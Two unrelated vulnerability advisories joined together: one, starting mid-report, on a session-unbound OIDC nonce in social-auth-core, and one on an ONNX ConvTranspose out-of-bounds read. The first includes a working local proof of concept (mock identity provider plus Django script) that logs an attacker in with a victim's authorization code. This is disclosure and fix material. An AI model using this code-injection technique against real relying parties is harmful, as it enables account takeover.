social-auth-core 6.1.1 (latest), 6.1.0 and 5.2.0, with social-auth-app-django 7.1.0 and Django 6.1.2, Python 3.14. The same code is on master (098ef399c1).

### Details

`social_core/backends/open_id_connect.py` in 6.1.1:

- line 252: `auth_params` calls `get_and_store_nonce(self.authorization_url(), state)`
- lines 333 to 346: `get_and_store_nonce` stores the nonce as an `OpenIdConnectAssociation` keyed by `server_url` and `handle=nonce`. The state goes into `assoc_type` but is never read back.
- lines 348 to 358: `get_nonce` looks the nonce up by `server_url` and `handle` only
- lines 393 to 415: `validate_claims` accepts any stored, unexpired nonce and removes it
- line 110: `DEFAULT_USE_PKCE = False`

### PoC

Everything runs locally. `mockidp.py` is a small OpenID provider on 127.0.0.1 that checks `redirect_uri` and enforces PKCE when a `code_challenge` was sent, like a normal provider. `social_nonce.py` uses two Django test clients as two browsers.

```
pip install social-auth-core social-auth-app-django django pyjwt cryptography
python social_nonce.py
```

Output on 6.1.1:

```
[inject] attacker session completes with victim code: (200, 'user=victim')
```

Controls:

```
MODE=control_victim python social_nonce.py
[control] victim completes normally: (200, 'user=victim')

MODE=control_unknown_nonce python social_nonce.py
[control] unknown nonce: ('EXC', 'AuthResponseError: The authentication response could not be matched to the request.')

PKCE=1 python social_nonce.py
[inject] attacker session completes with victim code: ('EXC', 'AuthCredentialError: The authorization code was rejected. Please restart login.')
```

So the nonce check runs, but it accepts a nonce that belongs to another browser. With PKCE on, the same attack fails.

mockidp.py:

```python
"""Minimal local OpenID Provider on 127.0.0.1 for testing RP libraries."""
import json, time, secrets, threading, hashlib, base64, urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import jwt
from cryptography.hazmat.primitives.asymmetric import rsa

def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

class IdP:
    def __init__(self, port=0, client_id="rp-client", client_secret="rp-secret", name="idp"):
        self.key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        self.kid = name + "-k1"
        self.client_id, self.client_secret = client_id, client_secret
        self.codes = {}
        self.access = {}
        self.claims_override = {}
        self.srv = ThreadingHTTPServer(("127.0.0.1", port), self._handler())
        self.port = self.srv.server_address[1]
        self.issuer = f"http://127.0.0.1:{self.port}"
        threading.Thread(target=self.srv.serve_forever, daemon=True).start()

    def jwk(self):
        n = self.key.public_key().public_numbers()
        tb = lambda i: i.to_bytes((i.bit_length() + 7) // 8, "big")
        return {"kty": "RSA", "kid": self.kid, "use": "sig", "alg": "RS256", "n": b64u(tb(n.n)), "e": b64u(tb(n.e))}

    def discovery(self):
        i = self.issuer
        return {"issuer": i, "authorization_endpoint": i + "/authorize", "token_endpoint": i + "/token",
                "userinfo_endpoint": i + "/userinfo", "jwks_uri": i + "/jwks",
                "response_types_supported": ["code"], "subject_types_supported": ["public"],
                "id_token_signing_alg_values_supported": ["RS256"],
                "token_endpoint_auth_methods_supported": ["client_secret_basic", "client_secret_post"],
                "code_challenge_methods_supported": ["S256"]}

    def user_authorizes(self, authorize_url, sub):
        """The end user `sub` approves an authorization request; returns (code, params)."""
        q = dict(urllib.parse.parse_qsl(urllib.parse.urlsplit(authorize_url).query))
        code = "code-" + secrets.token_hex(8)
        self.codes[code] = {"sub": sub, "nonce": q.get("nonce"), "redirect_uri": q.get("redirect_uri"),
                            "code_challenge": q.get("code_challenge")}
        return code, q

    def sign(self, claims):
        return jwt.encode(claims, self.key, algorithm="RS256", headers={"kid": self.kid})

    def _handler(idp):
        class H(BaseHTTPRequestHandler):
            def log_message(self, *a): pass
            def _json(self, obj, code=200):
                b = json.dumps(obj).encode()
                self.send_response(code); self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
            def do_GET(self):
                p = urllib.parse.urlsplit(self.path).path
                if p.endswith("/.well-known/openid-configuration"): return self._json(idp.discovery())
                if p == "/jwks": return self._json({"keys": [idp.jwk()]})
                if p == "/userinfo":
                    tok = (self.headers.get("Authorization") or "").split(" ")[-1]
                    sub = idp.access.get(tok)
                    if not sub: return self._json({"error": "invalid_token"}, 401)
                    return self._json({"sub": sub, "email": sub + "@example.test", "preferred_username": sub})
                return self._json({"error": "not_found"}, 404)
            def do_POST(self):
                n = int(self.headers.get("Content-Length") or 0)
                body = dict(urllib.parse.parse_qsl(self.rfile.read(n).decode()))
                p = urllib.parse.urlsplit(self.path).path
                if p == "/token":
                    rec = idp.codes.pop(body.get("code"), None)
                    if not rec: return self._json({"error": "invalid_grant"}, 400)
                    if rec["redirect_uri"] and body.get("redirect_uri") != rec["redirect_uri"]:
                        return self._json({"error": "invalid_grant"}, 400)
                    if rec["code_challenge"]:
                        v = body.get("code_verifier") or ""
                        if b64u(hashlib.sha256(v.encode()).digest()) != rec["code_challenge"]:
                            return self._json({"error": "invalid_grant"}, 400)
                    at = "at-" + secrets.token_hex(8)
                    idp.access[at] = rec["sub"]
                    now = int(time.time())
                    claims = {"iss": idp.issuer, "sub": rec["sub"], "aud": idp.client_id, "iat": now, "exp": now + 300,
                              "at_hash": b64u(hashlib.sha256(at.encode()).digest()[:16])}
                    if rec["nonce"]: claims["nonce"] = rec["nonce"]
                    claims.update(idp.claims_override)
                    return self._json({"access_token": at, "token_type": "Bearer", "expires_in": 300,
                                       "id_token": idp.sign(claims)})
                return self._json({"error": "not_found"}, 404)
        return H
```

social_nonce.py:

```python
import os, sys
sys.path.insert(0, os.path.dirname(__file__))
from mockidp import IdP
idp = IdP()
import django
from django.conf import settings
PKCE = os.environ.get("PKCE") == "1"
settings.configure(
    DEBUG=True, SECRET_KEY="x", ALLOWED_HOSTS=["*"], ROOT_URLCONF=__name__,
    INSTALLED_APPS=["django.contrib.auth", "django.contrib.contenttypes", "django.contrib.sessions", "social_django"],
    MIDDLEWARE=["django.contrib.sessions.middleware.SessionMiddleware", "django.contrib.auth.middleware.AuthenticationMiddleware"],
    DATABASES={"default": {"ENGINE": "django.db.backends.sqlite3", "NAME": ":memory:"}},
    AUTHENTICATION_BACKENDS=["social_core.backends.open_id_connect.OpenIdConnectAuth"],
    SOCIAL_AUTH_OIDC_OIDC_ENDPOINT=idp.issuer, SOCIAL_AUTH_OIDC_KEY=idp.client_id, SOCIAL_AUTH_OIDC_SECRET=idp.client_secret,
    SOCIAL_AUTH_OIDC_USE_PKCE=PKCE, SOCIAL_AUTH_LOGIN_REDIRECT_URL="/done/", SOCIAL_AUTH_RAISE_EXCEPTIONS=True,
)
django.setup()
from django.urls import include, path
from django.http import HttpResponse
urlpatterns = [path("", include("social_django.urls", namespace="social")),
               path("done/", lambda r: HttpResponse("user=%s" % r.user.username))]
from django.core.management import call_command
call_command("migrate", verbosity=0)
from django.test import Client

def begin(c):
    r = c.post("/login/oidc/"); assert r.status_code == 302, r.status_code
    return r["Location"]

def complete(c, code, state):
    try:
        r = c.get("/complete/oidc/", {"code": code, "state": state})
        if r.status_code == 302:
            r = c.get(r["Location"])
        return r.status_code, r.content.decode()
    except Exception as e:
        return "EXC", f"{type(e).__name__}: {e}"

victim, attacker = Client(), Client()
# Victim starts a login. The provider issues a code for "victim" tied to the victim's nonce.
v_url = begin(victim)
code_v, qv = idp.user_authorizes(v_url, "victim")
# Attacker starts a login in their own browser to get a valid state for their session.
a_url = begin(attacker)
_, qa = idp.user_authorizes(a_url, "attacker")
mode = os.environ.get("MODE", "inject")
if mode == "inject":
    print("[inject] attacker session completes with victim code:", complete(attacker, code_v, qa["state"]))
elif mode == "control_unknown_nonce":
    idp.claims_override = {"nonce": "never-issued-nonce"}
    print("[control] unknown nonce:", complete(attacker, code_v, qa["state"]))
elif mode == "control_victim":
    print("[control] victim completes normally:", complete(victim, code_v, qv["state"]))
```

### Impact

An attacker who gets a victim's authorization code before it is used can log in to the relying party as the victim. Codes leak in practice through the callback URL: Referer headers, proxy or server logs, browser history and sync, a malicious browser extension, or an open redirect on the callback. This is the exact case the OIDC nonce is meant to cover. The attacker does not need the client secret, because the relying party itself redeems the code.

It affects every app that uses `OpenIdConnectAuth` or a backend built on it with the default settings (PKCE off).

### Suggested fix

Bind the nonce to the session that started the login. For example, keep the nonce (or a hash of it) in the session next to `state` in `auth_params`, and in `validate_claims` compare the ID token nonce with the session value before removing it. Turning PKCE on by default for the OIDC backend would also close this, and matches the OAuth2 base class.

summary: ONNX: Out-of-bounds read in ConvTranspose shape inference via undersized weight rank
description:
## Summary

ONNX ConvTranspose shape inference performed an out-of-bounds read when the weight tensor had fewer than three dimensions and the model did not provide a `kernel_shape` attribute.

The inference function derived an empty `effective_kernel_shape` vector from the undersized weight tensor, then indexed that vector once for each spatial dimension of the input tensor. A crafted model passed `onnx.checker.check_model()` and caused SIGSEGV when passed to `onnx.shape_inference.infer_shapes()`.

## Technical details

For an input shape such as `[1, 1, 5]`, shape inference computes one spatial input dimension. A weight shape such as `[1, 3]` has no spatial dimensions, so deriving `kernel_shape` from dimensions 2 onward produces an empty vector. The output loop nevertheless accesses `effective_kernel_shape[0]`.

The defect affected both the older `convTransposeShapeInference_opset11()` path and the then-current ConvTranspose inference implementation.

## Impact

An application that performs shape inference on an untrusted model can be terminated, causing denial of service. The observed result was a deterministic process crash. No confidentiality or integrity impact was demonstrated.

## Affected versions

- Affected: ONNX 1.2.1 through 1.21.0
- Patched: ONNX 1.22.0

## Remediation

Upgrade to ONNX 1.22.0 or later. The fix rejects input and weight tensors with fewer than three dimensions before deriving the spatial kernel shape.

- Fix: [onnx/onnx#7997](https://github.com/onnx/onnx/pull/7997)
- Commit: [`2ec288908`](https://github.com/onnx/onnx/commit/2ec288908952eea9dcf48d4b197915e1f72c6abf)

The original malformed model was re-tested against the published ONNX 1.23.2 wheel and correctly raises `InferenceError`.

## Severity

The vulnerable ONNX component processes the malicious model through a local library API or file boundary and is not itself bound to a network stack. Applications that expose ONNX model processing over a network should calculate an Environmental score with Modified Attack Vector set to Network.
